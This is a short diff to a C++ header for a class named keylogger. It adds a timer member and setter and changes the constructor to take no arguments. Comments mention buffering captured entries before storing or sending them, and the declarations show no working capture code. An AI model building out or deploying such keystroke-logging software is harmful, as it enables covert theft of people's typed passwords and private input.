@@ -11,6 +11,7 @@ class keylogger
       bool a_no_click;
       bool a_alphabet_only;
       bool a_store_character;
+      int a_timer;
 
       /*
   		* Constructor with parameters
@@ -20,7 +21,7 @@ class keylogger
   		* p_buffer_size : Maximum size of buffer, to avoid storage or sending data at each
       * entry
   		*/
-		keylogger(size_t p_buffer_size);
+		keylogger();
 
     /*
     * Destructor
@@ -59,6 +60,10 @@ class keylogger
     */
     virtual void set_store_character(bool p_store_character);
 
+    /*
+    * Setter of a_timer;
+    */
+    virtual void set_timer(int p_timer);
 };
 
 #endif
